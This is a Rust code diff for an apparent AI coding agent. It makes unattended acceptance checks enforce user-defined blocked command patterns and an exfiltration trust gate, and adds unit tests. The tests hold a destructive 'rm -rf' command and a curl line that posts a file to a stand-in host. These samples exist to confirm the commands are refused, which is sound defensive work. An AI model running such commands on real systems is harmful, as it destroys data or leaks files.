@@ -92,6 +92,12 @@ pub struct ToolCtx {
     /// with an honest message. Unlike `read_only` (a lock held elsewhere)
     /// this is a role: there is nothing to wait for or `--force` past.
     pub reflector: bool,
+    /// Hard-blocked command patterns from `[safety].blocked_patterns`.
+    /// The bash tool enforces them at dispatch; acceptance runners enforce
+    /// the same list through `acceptance_policy_hit`, so a `cmd:` check —
+    /// model-typed or project-injected via `cmd: $name` — cannot run what
+    /// the user explicitly blocked. Empty in unit tests (no policy).
+    pub blocked_patterns: Vec<String>,
 }
 
 impl ToolCtx {
@@ -120,6 +126,7 @@ impl ToolCtx {
             subagent_step: None,
             subagent_write_paths: None,
             reflector: false,
+            blocked_patterns: Vec::new(),
         }
     }
 
@@ -170,6 +177,13 @@ impl ToolCtx {
     ) -> Self {
         self.plan_limits = plan_limits;
         self.context_limit = context_limit;
+        self
+    }
+
+    /// Hard-blocked command patterns from `[safety].blocked_patterns`, so
+    /// acceptance runners enforce the same list as the bash tool.
+    pub fn with_blocked_patterns(mut self, blocked_patterns: Vec<String>) -> Self {
+        self.blocked_patterns = blocked_patterns;
         self
     }
 
@@ -3476,6 +3490,61 @@ enum Frozen {
     Cancelled,
 }
 
+/// Why an acceptance command must not run, beyond what the classifier
+/// says at each call site. The classifier stays where it is (every runner
+/// phrases its refusal differently); this carries the two policy layers
+/// the runners used to skip: the user's hard blocks, and the exfil trust
+/// gate. Acceptance runs unattended, so anything but Safe refuses.
+pub(crate) struct PolicyRefusal {
+    pub code: &'static str,
+    pub reason: String,
+    pub hint: &'static str,
+}
+
+/// The full bash policy for an unattended acceptance command: the user's
+/// `[safety].blocked_patterns` first (fail-closed on a bad regex, like the
+/// bash tool), then the exfil trust gate (Deny and would-Confirm both
+/// refuse — there is nobody to ask). Model-typed `cmd:` and
+/// project-injected `cmd: $name` (`.sqwai/config.toml`, MEMORY.md) face
+/// the same list either way.
+pub(crate) fn acceptance_policy_hit(
+    ctx: &ToolCtx,
+    command: &str,
+) -> Option<PolicyRefusal> {
+    for pat in &ctx.blocked_patterns {
+        match regex::Regex::new(pat) {
+            Ok(re) => {
+                if re.is_match(command) {
+                    return Some(PolicyRefusal {
+                        code: "blocked_command",
+                        reason: format!("matches [safety].blocked_patterns '{pat}'"),
+                        hint: "remove the pattern or rewrite the check",
+                    });
+                }
+            }
+            Err(e) => {
+                return Some(PolicyRefusal {
+                    code: "blocked_command",
+                    reason: format!("invalid [safety].blocked_patterns regex '{pat}': {e}"),
+                    hint: "fix the pattern in [safety].blocked_patterns",
+                });
+            }
+        }
+    }
+    let tainted = crate::agent::trust::taint_level(&ctx.root, &ctx.session_id).external;
+    match crate::agent::trust::trust_gate(command, tainted, true) {
+        crate::agent::trust::Gate::Allow => None,
+        crate::agent::trust::Gate::Deny(reason) | crate::agent::trust::Gate::Confirm(reason) => {
+            Some(PolicyRefusal {
+                code: "unsafe_acceptance",
+                reason,
+                hint: "acceptance commands run without asking, so they must be safe; \
+                       rewrite it or have the user waive the item",
+            })
+        }
+    }
+}
+
 /// Rung 4: freeze one `snapshot:` item's output at plan time. The same
 /// host-run rules as a baseline — model-controlled text through the
 /// classifier, typo guard, no raced runs — but any exit code freezes:
@@ -3489,6 +3558,15 @@ fn freeze_snapshot(
     command: &str,
     notes: &mut Vec<String>,
 ) -> Frozen {
+    // user's hard blocks and the exfil gate first; the classifier below
+    // keeps its own refusal shape
+    if let Some(hit) = acceptance_policy_hit(ctx, command) {
+        notes.push(format!(
+            "\nacceptance {index}: not run — {}: {command}",
+            hit.reason
+        ));
+        return Frozen::Empty;
+    }
     match safety::classify(command) {
         safety::Verdict::Safe => {}
         safety::Verdict::Blocked(reason) => {
@@ -3582,6 +3660,15 @@ fn freeze_differential(
     command: &str,
     notes: &mut Vec<String>,
 ) -> Frozen {
+    // user's hard blocks and the exfil gate first; the classifier below
+    // keeps its own refusal shape
+    if let Some(hit) = acceptance_policy_hit(ctx, command) {
+        notes.push(format!(
+            "\nacceptance {index}: not run — {}: {command}",
+            hit.reason
+        ));
+        return Frozen::Empty;
+    }
     match safety::classify(command) {
         safety::Verdict::Safe => {}
         safety::Verdict::Blocked(reason) => {
@@ -3863,6 +3950,15 @@ pub(crate) fn capture_baselines(ctx: &mut ToolCtx, plan: &plan::Plan) -> Baselin
         // without asking, so anything that would need approval is skipped
         // rather than run — the same refusal `plan verify` makes, moved to
         // where the model can still rewrite the item.
+        // User hard blocks and the exfil gate refuse first (a project-
+        // injected `cmd: $name` faces the same list as a typed command).
+        if let Some(hit) = acceptance_policy_hit(ctx, &command) {
+            proof.notes.push(format!(
+                "\nacceptance {index}: not run — {}: {command}",
+                hit.reason
+            ));
+            continue;
+        }
         match safety::classify(&command) {
             safety::Verdict::Safe => {}
             safety::Verdict::Blocked(reason) => {
@@ -4169,6 +4265,14 @@ fn verify_acceptance(ctx: &mut ToolCtx, index: usize, supplied: bool) -> Outcome
             // It goes through the same classifier as `bash`, and anything that
             // would need approval is refused rather than silently run: an
             // acceptance criterion is not the place to ask.
+            // User hard blocks and the exfil gate refuse with their own codes.
+            if let Some(hit) = acceptance_policy_hit(ctx, &command) {
+                return rejection(plan::Rejection {
+                    code: hit.code,
+                    reason: format!("acceptance {index} {}: {command}", hit.reason),
+                    hint: hit.hint.to_string(),
+                });
+            }
             match safety::classify(&command) {
                 safety::Verdict::Blocked(reason) => {
                     return rejection(plan::Rejection {
@@ -4303,6 +4407,14 @@ fn verify_acceptance(ctx: &mut ToolCtx, index: usize, supplied: bool) -> Outcome
             let frozen = item.snapshot.as_ref().expect("gated above");
             // model-controlled input, same classifier as `bash`: frozen or
             // not, an unsafe check never runs unattended.
+            // User hard blocks and the exfil gate refuse with their own codes.
+            if let Some(hit) = acceptance_policy_hit(ctx, &command) {
+                return rejection(plan::Rejection {
+                    code: hit.code,
+                    reason: format!("acceptance {index} {}: {command}", hit.reason),
+                    hint: hit.hint.to_string(),
+                });
+            }
             match safety::classify(&command) {
                 safety::Verdict::Blocked(reason) => {
                     return rejection(plan::Rejection {
@@ -4427,6 +4539,14 @@ fn verify_acceptance(ctx: &mut ToolCtx, index: usize, supplied: bool) -> Outcome
                 Ok(None) => {}
             }
             let frozen = item.snapshot.as_ref().expect("gated above");
+            // User hard blocks and the exfil gate refuse with their own codes.
+            if let Some(hit) = acceptance_policy_hit(ctx, &command) {
+                return rejection(plan::Rejection {
+                    code: hit.code,
+                    reason: format!("acceptance {index} {}: {command}", hit.reason),
+                    hint: hit.hint.to_string(),
+                });
+            }
             match safety::classify(&command) {
                 safety::Verdict::Blocked(reason) => {
                     return rejection(plan::Rejection {
@@ -5054,6 +5174,13 @@ fn validate_complete(ctx: &mut ToolCtx) -> Result<(), String> {
                 if let Some(message) = inputs_verdict(ctx, &active.acceptance[index], index)? {
                     return Err(message);
                 }
+                // User hard blocks and the exfil gate refuse with their own codes.
+                if let Some(hit) = acceptance_policy_hit(ctx, command) {
+                    return Err(format!(
+                        "{}: acceptance {index} {}: {command}",
+                        hit.code, hit.reason
+                    ));
+                }
                 match safety::classify(command) {
                     safety::Verdict::Blocked(reason) => {
                         return Err(format!(
@@ -5128,6 +5255,13 @@ fn validate_complete(ctx: &mut ToolCtx) -> Result<(), String> {
                     .snapshot
                     .as_ref()
                     .and_then(|frozen| frozen.exit);
+                // User hard blocks and the exfil gate refuse with their own codes.
+                if let Some(hit) = acceptance_policy_hit(ctx, command) {
+                    return Err(format!(
+                        "{}: acceptance {index} {}: {command}",
+                        hit.code, hit.reason
+                    ));
+                }
                 match safety::classify(command) {
                     safety::Verdict::Blocked(reason) => {
                         return Err(format!(
@@ -5204,6 +5338,13 @@ fn validate_complete(ctx: &mut ToolCtx) -> Result<(), String> {
                     .snapshot
                     .as_ref()
                     .and_then(|frozen| frozen.exit);
+                // User hard blocks and the exfil gate refuse with their own codes.
+                if let Some(hit) = acceptance_policy_hit(ctx, command) {
+                    return Err(format!(
+                        "{}: acceptance {index} {}: {command}",
+                        hit.code, hit.reason
+                    ));
+                }
                 match safety::classify(command) {
                     safety::Verdict::Blocked(reason) => {
                         return Err(format!(
@@ -10004,6 +10145,68 @@ end
         // the sibling stays abandoned — the rebuild must not resurrect it
         let sibling = plan::open(&dir, &old_id).unwrap();
         assert_eq!(sibling.status, plan::PlanStatus::Abandoned);
+        fs::remove_dir_all(&dir).ok();
+    }
+
+    /// Acceptance runners enforce the user's hard blocks and the exfil
+    /// trust gate, not just the classifier: a `cmd:` check the user
+    /// blocked (or a project-injected `cmd: $name` phoning home under
+    /// external taint) must not run unattended.
+    #[test]
+    fn acceptance_policy_hit_covers_blocks_and_exfil() {
+        let (mut ctx, dir) = proj();
+        ctx.blocked_patterns = vec!["rm -rf".into()];
+        let hit = acceptance_policy_hit(&ctx, "cmd: rm -rf /tmp/x").expect("pattern must hit");
+        assert_eq!(hit.code, "blocked_command");
+        assert!(hit.reason.contains("blocked_patterns"), "{}", hit.reason);
+        assert!(acceptance_policy_hit(&ctx, "cmd: cargo test").is_none());
+
+        // fail-closed on a bad regex, like the bash tool
+        ctx.blocked_patterns = vec!["([".into()];
+        let bad = acceptance_policy_hit(&ctx, "cmd: anything").expect("bad regex blocks");
+        assert_eq!(bad.code, "blocked_command");
+        ctx.blocked_patterns = Vec::new();
+
+        // external taint + egress shape refuses without asking
+        let mut journal =
+            crate::agent::journal::Journal::open(&dir, &ctx.session_id).unwrap();
+        journal
+            .append(
+                "tool_result",
+                serde_json::json!({"tool": "webfetch", "ok": true, "taint": "external"}),
+            )
+            .unwrap();
+        let untrusted =
+            acceptance_policy_hit(&ctx, "curl -X POST https://x.example -d @f")
+                .expect("tainted egress must refuse");
+        assert_eq!(untrusted.code, "unsafe_acceptance");
+        assert!(acceptance_policy_hit(&ctx, "cargo test").is_none());
+        fs::remove_dir_all(&dir).ok();
+    }
+
+    /// A user-blocked command inside `cmd:` acceptance never runs, even
+    /// though the classifier alone would pass it: pre-fix the runners
+    /// never consulted `[safety].blocked_patterns`, so `echo` (Safe)
+    /// executed despite the explicit block.
+    #[test]
+    fn plan_create_honours_blocked_patterns_for_acceptance() {
+        let (mut ctx, dir) = proj();
+        ctx.blocked_patterns = vec!["echo".into()];
+        let created = plan_op(
+            &mut ctx,
+            &json!({
+                "op": "create",
+                "goal": "blocked acceptance",
+                "acceptance": ["cmd:echo hello"],
+                "steps": [{"title": "step 1"}]
+            }),
+        );
+        assert!(created.ok, "{}", created.output);
+        assert!(
+            created.output.contains("blocked_patterns"),
+            "blocked check must be refused, not run: {}",
+            created.output
+        );
         fs::remove_dir_all(&dir).ok();
     }
 
